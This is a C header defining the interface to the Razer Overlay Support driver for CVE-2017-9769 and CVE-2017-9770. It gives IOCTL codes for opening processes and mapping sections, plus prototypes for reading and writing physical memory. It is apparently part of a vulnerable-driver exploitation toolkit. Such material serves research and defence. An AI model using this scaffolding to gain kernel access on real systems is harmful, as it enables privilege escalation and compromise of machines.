/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020
*
*  TITLE:       RZPNK.H
*
*  VERSION:     1.00
*
*  DATE:        02 Feb 2020
*
*  Razer Overlay Support driver interface header.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#pragma once

//
// Razer Overlay Support driver interface for CVE-2017-9769, CVE-2017-9770.
//

#define RAZER_DEVICE_TYPE 0x00000022 //DEVICE_TYPE_UNKNOWN

#define RAZER_OPEN_PROCESS_FUNCID   (DWORD)0x814
#define RAZER_MAP_SECTION_FUNCID    (DWORD)0x819

#define IOCTL_RZPNK_OPEN_PROCESS            CTL_CODE(RAZER_DEVICE_TYPE, RAZER_OPEN_PROCESS_FUNCID, METHOD_BUFFERED, FILE_WRITE_ACCESS) //0x22A050
#define IOCTL_RZPNK_MAP_SECTION_USER_MODE   CTL_CODE(RAZER_DEVICE_TYPE, RAZER_MAP_SECTION_FUNCID, METHOD_BUFFERED, FILE_WRITE_ACCESS) //0x22A064

#define SYSTEM_PID_MAGIC 4
#define SYSTEM_USER_TO_KERNEL_HANDLE 0xffffffff80000000

typedef struct _RAZER_OPEN_PROCESS {
    HANDLE ProcessId;
    HANDLE ProcessHandle;
} RAZER_OPEN_PROCESS, * PRAZER_OPEN_PROCESS;

#pragma warning(push)
#pragma warning(disable:4324) // structure padded due to __declspec(align())
typedef struct DECLSPEC_ALIGN(MEMORY_ALLOCATION_ALIGNMENT)_RAZER_MAP_SECTION_INFO {
    HANDLE ProcessHandle;
    HANDLE ProcessId;
    HANDLE SectionHandle;
    PVOID MappedBaseAddress;
    ULONG ViewCommitSize; //WARNING, cannot map above 4GB
    NTSTATUS Status;
} RAZER_MAP_SECTION_INFO, * PRAZER_MAP_SECTION_INFO;
#pragma warning(pop)

BOOL WINAPI RazerRegisterDriver(
    _In_ HANDLE DeviceHandle);

BOOL WINAPI RazerUnregisterDriver(
    _In_ HANDLE DeviceHandle);

BOOL WINAPI RazerReadPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytes);

BOOL WINAPI RazerWritePhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes);
